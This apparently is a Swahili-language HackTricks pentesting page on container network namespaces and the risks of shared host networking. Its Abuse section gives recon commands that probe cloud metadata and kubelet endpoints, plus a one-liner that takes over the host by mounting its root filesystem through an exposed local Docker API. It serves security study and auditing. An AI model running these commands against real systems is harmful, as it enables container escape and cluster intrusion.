# Namespace ya Mtandao

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

Namespace ya mtandao inatenga rasilimali zinazohusiana na mtandao kama interfaces, IP addresses, routing tables, ARP/neighbor state, sheria za firewall, sockets, na yaliyomo kwenye faili kama `/proc/net`. Hii ndiyo sababu container inaweza kuonekana kuwa na `eth0` yake mwenyewe, routes zake za ndani, na kifaa chake cha loopback bila kumiliki stack halisi ya mtandao ya host.

Kielelezo cha usalama, hili ni muhimu kwa sababu kutengwa kwa mtandao ni zaidi ya kuunganisha ports tu. Namespace ya mtandao ya kibinafsi inapunguza kile workload inaweza kuangalia au kupangilia moja kwa moja. Mara namespace hiyo inashirikiwa na host, container inaweza ghafla kupata uwezo wa kuona host listeners, host-local services, na vidhibiti vya mtandao ambavyo hakukusudiwa kuonekana kwa application.

## Uendeshaji

Namespace mpya ya mtandao huanza na mazingira ya mtandao tupu au karibu tupu hadi interfaces ziwe zimeambatishwa kwake. Container runtimes kisha huunda au kuunganisha virtual interfaces, kupeana addresses, na kusanidi routes ili workload iwe na connectivity inayotarajiwa. Katika deployments zinazotegemea bridge, hii kwa kawaida inamaanisha container inaona interface ya veth inayounganishwa na host bridge. Katika Kubernetes, CNI plugins zinashughulikia usanidi sawa kwa networking ya Pod.

Muundo huu unaelezea kwa nini `--network=host` au `hostNetwork: true` ni mabadiliko makubwa. Badala ya kupokea stack ya mtandao ya kibinafsi iliyotayarishwa, workload inaingia kwenye stack halisi ya host.

## Maabara

Unaweza kuona namespace ya mtandao karibu tupu kwa:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Na unaweza kulinganisha containers za kawaida na host-networked kwa:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Container iliyounganishwa kwenye mtandao wa mwenyeji haioni tena socket na mtazamo wa interfaces uliotengwa kwake. Mabadiliko hayo peke yake ni muhimu kabla hata huulize ni uwezo gani mchakato unao.

## Runtime Usage

Docker na Podman kwa kawaida huunda private network namespace kwa kila container isipokuwa imewekwa vinginevyo. Kubernetes kawaida hutoa kila Pod network namespace yake mwenyewe, inayoshirikiwa na containers ndani ya Pod hiyo lakini tofauti na mwenyeji. Incus/LXC systems pia hutoa upunguzaji wa kipekee unaotegemea network-namespace, mara nyingi kwa aina mbalimbali za virtual networking setups.

Kanuni ya kawaida ni kwamba private networking ndicho kingo cha utafsiri chaguo-msingi, wakati host networking ni kutokubali wazi kutoka kwenye kingo hiyo.

## Misconfigurations

Marekebisho mabaya muhimu ni kushiriki tu host network namespace. Hii wakati mwingine hufanywa kwa utendaji, ufuatiliaji wa chini-ya-ngazi, au urahisi, lakini huondoa moja ya mipaka safi zaidi inayopatikana kwa containers. Host-local listeners huwa wanafikika kwa njia ya moja kwa moja zaidi, services zinazohusishwa na localhost zinaweza kupatikana, na capabilities kama `CAP_NET_ADMIN` au `CAP_NET_RAW` zinakuwa hatari zaidi kwa sababu operesheni wanazoruhusu sasa zinaathiri mazingira ya mtandao ya mwenyeji.

Tatizo lingine ni kutoa kwa wingi network-related capabilities hata wakati network namespace ni private. Namespace binafsi husaidia, lakini haisi kufanya raw sockets au udhibiti wa hali ya juu wa mtandao kuwa usio hatari.

Katika Kubernetes, `hostNetwork: true` pia hubadilisha kiwango cha imani unachoweza kuwa nacho katika segmentation ya mtandao ya ngazi ya Pod. Kubernetes inaeleza kwamba plugins nyingi za mtandao hawawezi kutofautisha vizuri trafiki ya Pod yenye `hostNetwork` kwa ajili ya `podSelector` / `namespaceSelector` na kwa hivyo huezwa kama trafiki ya kawaida ya node. Kwa mtazamo wa mshambuliaji, hiyo inamaanisha kazi iliyoharibika yenye `hostNetwork` mara nyingi inapaswa kutendewa kama foothold ya mtandao ya ngazi ya node badala ya Pod ya kawaida bado iliyo na vikwazo vya sera zilizotumika kwa overlay-network workloads.

## Abuse

Katika mazingira yenye upungufu wa upunguzaji, mshambuliaji anaweza kuchunguza services zinazolisimamiwa na mwenyeji, kufikia management endpoints zilizofungwa kwa loopback pekee, kusnjiua au kuingilia trafiki kulingana na capabilities na mazingira halisi, au kureconfigure routing na hali ya firewall ikiwa `CAP_NET_ADMIN` ipo. Katika cluster, hii pia inaweza kufanya harakati za upande na upelelezi wa control-plane kuwa rahisi zaidi.

Ikiwa unashuku host networking, anza kwa kuthibitisha kwamba interfaces na listeners zinazoonekana zinamhusu mwenyeji badala ya mtandao uliotengwa wa container:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only services mara nyingi huwa ugunduzi wa kwanza unaovutia:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Ikiwa uwezo wa mtandao upo, jaribu kama workload inaweza kuchunguza au kubadilisha stack inayoonekana:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Kwenye kernel za kisasa, host networking pamoja na `CAP_NET_ADMIN` inaweza pia kufichua njia ya packet zaidi ya mabadiliko rahisi ya `iptables` / `nftables`. `tc` qdiscs na filters pia zimetengwa kwa namespace, hivyo katika namespace ya host network iliyoshirikiwa zinatumika kwa host interfaces ambazo container inaweza kuona. Ikiwa `CAP_BPF` pia ipo, network-related eBPF programs such as TC and XDP loaders pia zitakuwa muhimu:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Hii ni muhimu kwa sababu attacker anaweza ku-mirror, ku-redirect, ku-shape, au ku-drop traffic kwenye host interface level, si tu ku-rewrite firewall rules. Katika private network namespace hatua hizo zinabaki kwa mtazamo wa container; katika shared host namespace zinakuwa host-impacting.

Katika cluster au cloud environments, host networking pia inaifanya kuwa ya maana kufanya quick local recon ya metadata na control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Mfano Kamili: Mtandao wa Host + Runtime ya Ndani / Ufikiaji wa Kubelet

Mtandao wa host hauwezi moja kwa moja kumpa root ya host, lakini mara nyingi unaonyesha huduma ambazo kwa makusudi zinaweza kufikiwa tu kutoka kwenye node yenyewe. Ikiwa moja ya huduma hizo imekulindwa vibaya, mtandao wa host unakuwa njia ya moja kwa moja ya privilege-escalation.

Docker API kwenye localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet kwenye localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Athari:

- kuingiliwa kwa moja kwa moja kwa host ikiwa local runtime API imefunuliwa bila ulinzi unaofaa
- uchunguzi wa cluster au lateral movement ikiwa kubelet au local agents zinaweza kufikiwa
- traffic manipulation au denial of service wakati ikishirikiana na `CAP_NET_ADMIN`

## Ukaguzi

Lengo la ukaguzi huu ni kubaini kama mchakato una private network stack, ni routes na listeners gani zinaonekana, na kama mtazamo wa mtandao tayari unaonekana kama host kabla hata ya kujaribu capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- Ikiwa `/proc/self/ns/net` na `/proc/1/ns/net` tayari zinaonekana host-like, container inaweza kuwa inashiriki host network namespace au namespace nyingine isiyo binafsi.
- `lsns -t net` na `ip netns identify` zinafaa wakati shell tayari iko ndani ya named au persistent namespace na unataka kuihusisha na vitu vya `/run/netns` kutoka upande wa host.
- `ss -lntup` ni hasa ya thamani kwa sababu inaonyesha loopback-only listeners na local management endpoints.
- Routes, interface names, firewall context, `tc` state, na eBPF attachments zinakuwa muhimu zaidi ikiwa `CAP_NET_ADMIN`, `CAP_NET_RAW`, au `CAP_BPF` zipo.
- Katika Kubernetes, kushindwa kwa service-name resolution kutoka Pod ya `hostNetwork` kunaweza kumaanisha tu kwamba Pod haisitumi `dnsPolicy: ClusterFirstWithHostNet`, si kwamba service haipo.

Unapopitia container, thamini kila wakati network namespace pamoja na capability set. Host networking pamoja na strong network capabilities ni mtazamo tofauti kabisa na bridge networking pamoja na narrow default capability set.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
